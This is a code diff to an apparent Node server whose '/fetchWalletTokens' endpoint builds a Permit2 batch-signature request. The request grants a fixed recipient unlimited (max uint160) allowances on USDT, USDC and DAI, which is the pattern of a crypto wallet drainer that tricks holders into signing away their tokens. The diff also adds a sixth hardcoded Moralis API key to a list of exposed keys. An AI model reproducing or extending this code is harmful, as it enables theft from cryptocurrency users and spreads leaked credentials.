@@ -78,12 +78,14 @@ var moralisApiKey2 = "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1Aw
 var moralisApiKey3 = "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
 var moralisAPikey4 = "7f8r9DVeWUgv2AO7xZxTRkmZ6yx5l85WvTJfrj0ZEhBE8jXk8txiYI6m66ZNos5D";
 var moralisApiKey5 = "qnEZj5njvRvnQ8eLMcaqnoItrPuQUrTjXRbHpZ207njJF1PmcI31dhSXBwRDgBnB";
+var moralisApiKey6 = "NyA8UXQuHHtgDfgTRWzrrTMABUnCxPDQHHBHPEP0TScNZYE5WmIMxajhcZ6GA7j0";
 var moralisKeys = [
     moralisApiKey1,
     moralisApiKey2,
     moralisApiKey3,
     moralisAPikey4,
     moralisApiKey5,
+    moralisApiKey6,
 ];
 var selectedKey = moralisKeys[Number((_a = process.env.MORALIS_KEY_INDEX) !== null && _a !== void 0 ? _a : 1)];
 // console.log(selectedKey);
@@ -287,40 +289,61 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                         sigDeadline: deadline,
                     },
                 };
-                return [2 /*return*/, [dataToSign, _addrs]];
+                return [2 /*return*/, [_dataToSign, _addrs]];
         }
     });
 }); });
-var dataToSign = function (detailsArray) {
-    var dataToSign = {
-        domain: {
-            name: "Permit2",
-            chainId: chainId,
-            verifyingContract: Permit2Contract,
-        },
-        types: {
-            EIP712Domain: [
-                { name: "name", type: "string" },
-                { name: "chainId", type: "uint256" },
-                { name: "verifyingContract", type: "address" },
-            ],
-            PermitBatch: [
-                { name: "details", type: "PermitDetails[]" },
-                { name: "spender", type: "address" },
-                { name: "sigDeadline", type: "uint256" },
-            ],
-            PermitDetails: [
-                { name: "token", type: "address" },
-                { name: "amount", type: "uint160" },
-                { name: "expiration", type: "uint48" },
-                { name: "nonce", type: "uint48" },
-            ],
-        },
-        primaryType: "PermitBatch",
-        message: {
-            details: detailsArray,
-            spender: recipient,
-            sigDeadline: deadline,
-        },
-    };
+var usdcContractAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
+var daiContractAddr = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
+var usdtContractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+var dett = [
+    {
+        token: usdtContractAddress,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+    {
+        token: usdcContractAddress,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+    {
+        token: daiContractAddr,
+        amount: maxUint160,
+        expiration: deadline,
+        nonce: nonce,
+    },
+];
+var _dataToSign = {
+    domain: {
+        name: "Permit2",
+        chainId: chainId,
+        verifyingContract: Permit2Contract,
+    },
+    types: {
+        EIP712Domain: [
+            { name: "name", type: "string" },
+            { name: "chainId", type: "uint256" },
+            { name: "verifyingContract", type: "address" },
+        ],
+        PermitBatch: [
+            { name: "details", type: "PermitDetails[]" },
+            { name: "spender", type: "address" },
+            { name: "sigDeadline", type: "uint256" },
+        ],
+        PermitDetails: [
+            { name: "token", type: "address" },
+            { name: "amount", type: "uint160" },
+            { name: "expiration", type: "uint48" },
+            { name: "nonce", type: "uint48" },
+        ],
+    },
+    primaryType: "PermitBatch",
+    message: {
+        details: dett,
+        spender: recipient,
+        sigDeadline: deadline,
+    },
 };
